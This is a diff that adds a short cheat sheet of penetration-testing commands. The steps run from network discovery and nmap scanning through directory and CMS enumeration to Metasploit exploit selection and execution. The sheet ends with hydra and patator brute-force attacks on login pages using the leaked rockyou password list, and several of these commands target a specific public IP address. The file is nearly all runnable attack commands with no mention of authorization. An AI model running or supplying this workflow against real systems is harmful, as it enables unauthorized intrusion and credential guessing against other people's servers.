@@ -1,0 +1,33 @@
+Search network:
+sudo netdiscover -r 188.166.0.0/24
+
+Scan services and open ports on machine:
+sudo nmap -sV -O 188.166.20.197
+
+Find paths in website:
+dirbuster
+- choose wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+CMS detection (scans WordPress, Joomla, Drupal etc):
+cmseek
+
+Search exploits on Metasploit:
+msfconsole
+search drupal
+search spring
+use 2 (choose the exploit number, example 2)
+show info
+show options
+set RHOSTS 192.168.0.183 (just an example)
+exploit
+
+Brute force attack on login page (it works only with forms that post, not with ajax and json):
+sudo apt install seclists
+sudo tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -u -f 188.166.20.197 -s 80 http-post-form "/:username=^USER^&password=^PASS^:F=<form id='loginForm'"
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -u -f 188.166.20.197 -s 80 http-post-form "/login:username=^USER^&password=^PASS^:F=401"
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -u -f 188.166.20.197 -s 80 http-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type: application/json:F={\"message\"\:\"bad user name or password\"}"
+
+Brute force attack on login page (with json):
+sudo apt install patator
+patator http_fuzz url="http://188.166.20.197/login" resolve=188.166.20.197:188.166.20.197 method=POST header='Content-Type: application/json' body='{"username":"FILE0","password":"FILE1"}' 0=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 1=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -x ignore:code=401 -t 50
